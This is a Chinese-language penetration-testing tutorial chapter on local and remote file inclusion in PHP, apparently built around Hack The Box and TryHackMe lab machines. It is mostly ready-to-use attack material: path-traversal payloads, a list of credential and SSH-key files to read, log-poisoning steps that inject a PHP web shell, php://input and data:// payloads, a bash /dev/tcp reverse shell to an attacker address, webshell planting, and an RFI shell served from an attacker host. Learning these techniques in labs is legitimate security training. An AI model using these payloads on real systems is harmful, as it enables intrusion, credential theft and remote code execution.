# Ch 12 — 檔案包含（LFI/RFI）與日誌毒化

> 目標：理解 LFI/RFI 漏洞，能用它讀取敏感檔案，並透過日誌毒化升級成 RCE。

## 什麼是檔案包含漏洞

PHP 等語言允許動態包含檔案：

```php
// 有漏洞的程式碼
<?php
$page = $_GET['page'];
include($page . ".php");
?>

// 正常用法：?page=about → include("about.php")
// 攻擊用法：?page=../../../etc/passwd%00
```

### LFI（Local File Inclusion）

讀取**本機**的任意檔案：

```
http://target.com/index.php?page=../../../etc/passwd
```

### RFI（Remote File Inclusion）

包含**遠端**的檔案（通常是惡意 PHP）：

```
http://target.com/index.php?page=http://attacker.com/shell.txt
```

RFI 的前提：PHP 設定 `allow_url_include = On`（現代 PHP 預設關閉）。

## LFI 基礎：讀取敏感檔案

### Path Traversal（目錄穿越）

```bash
# 基本格式
?page=../../../etc/passwd

# 如果應用只是把 ../../../ 過濾掉，試雙寫：
?page=....//....//....//etc/passwd

# URL 編碼：
?page=..%2F..%2F..%2Fetc%2Fpasswd

# Null byte（PHP < 5.3.4，繞過 .php 後綴）：
?page=../../../etc/passwd%00
```

### 常見目標檔案

```bash
# Linux
/etc/passwd         # 使用者清單（密碼是 x，在 shadow）
/etc/shadow         # 密碼 hash（需要 root 或 shadow 群組）
/etc/hosts          # 主機名對應
/proc/self/environ  # 環境變數（可能有密碼）
/proc/self/cmdline  # 當前程序的命令列

# Web 設定檔
/etc/apache2/sites-enabled/000-default.conf
/etc/nginx/sites-enabled/default
/var/www/html/config.php
/var/www/html/wp-config.php          # WordPress 資料庫密碼

# SSH
/home/user/.ssh/id_rsa               # SSH 私鑰
/root/.ssh/id_rsa

# Windows
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\xampp\htdocs\config.php
```

## 日誌毒化（Log Poisoning）→ RCE

**這是 LFI 升級成 RCE 的最常見方法。**

### 原理

1. Web 伺服器日誌記錄所有 HTTP 請求，包括 User-Agent
2. 你把 PHP 程式碼寫進 User-Agent
3. 用 LFI 包含日誌檔 → PHP 解析執行你的程式碼

### SSH 日誌毒化

```bash
# 先確認可以讀 SSH 日誌
?page=/var/log/auth.log
?page=/var/log/syslog

# 用 SSH 連接，把 PHP 程式碼塞進使用者名：
ssh '<?php system($_GET["cmd"]); ?>'@10.10.10.x

# 然後用 LFI 觸發：
?page=/var/log/auth.log&cmd=id
```

### Apache 日誌毒化

```bash
# 確認可以讀 Apache 日誌
?page=/var/log/apache2/access.log

# 用 curl 發一個 User-Agent 含 PHP 的請求：
curl -v http://10.10.10.x/ -H "User-Agent: <?php system(\$_GET['cmd']); ?>"

# 觸發：
?page=/var/log/apache2/access.log&cmd=id
```

### /proc/self/environ 毒化

```bash
# 環境變數中 User-Agent 常被記錄
curl -v http://10.10.10.x/index.php?page=/proc/self/environ \
    -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
```

## PHP 包裝器（Wrappers）

PHP 有內建的 stream wrapper，可以繞過後綴限制：

### php://filter（讀 PHP 原始碼）

```bash
# 如果 include("$page.php") 直接讀，看不到 PHP 原始碼
# 用 base64 編碼繞過
?page=php://filter/convert.base64-encode/resource=config

# 輸出是 base64，解碼就能看到 config.php 的原始碼
echo "base64string..." | base64 -d
```

### php://input（POST 資料執行）

```bash
# 需要 allow_url_include = On
curl -X POST "http://target/?page=php://input" \
    --data "<?php system('id'); ?>"
```

### data:// wrapper

```bash
# 直接在 URL 裡放 PHP 程式碼
?page=data://text/plain,<?php system('id'); ?>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```

## LFI 轉反彈 Shell

確認可以執行指令後，取得反彈 shell：

```bash
# 在 Kali 啟動監聽
nc -nvlp 4444

# 觸發反彈 shell（URL 編碼）
?page=/var/log/apache2/access.log&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.5/4444+0>%261'
```

或者先寫入一個 webshell：

```bash
# 寫入 /tmp 的 PHP shell
?page=/var/log/apache2/access.log&cmd=echo+PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8+|base64+-d+>+/var/www/html/shell.php

# 然後直接訪問
http://target/shell.php?cmd=bash+-c+...
```

## 工具：LFISuite / kadimus

```bash
# 自動化 LFI 測試和提取
python3 kadimus.py -u "http://target/?page=FUZZ"
```

## RFI 攻擊

如果 `allow_url_include` 開著：

```bash
# 1. 在 Kali 建立 PHP shell
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.txt

# 2. 啟動 HTTP 伺服器
cd /tmp && python3 -m http.server 80

# 3. 在目標上包含遠端 shell
?page=http://10.10.14.5/shell.txt&cmd=id
```

## 本章對應靶機

| 機器 | LFI 重點 |
|------|---------|
| HTB Beep | LFI → 讀設定檔 → 帳密 |
| HTB Nineveh | LFI → 日誌毒化 → Shell |
| HTB LaCasaDePapel | PHP filter wrapper |
| THM File Inclusion | 練習各種 LFI 和 RFI |

## 自我檢核

- [ ] 能用 Path Traversal 讀 `/etc/passwd`
- [ ] 能用 `php://filter` 讀 PHP 原始碼（base64）
- [ ] 知道 Apache 日誌毒化的步驟（User-Agent → 包含日誌）
- [ ] 能把 LFI 轉成反彈 shell

→ [Ch 13 檔案上傳繞過：MIME / 副檔名 / 魔術字元](./13-file-upload.md)
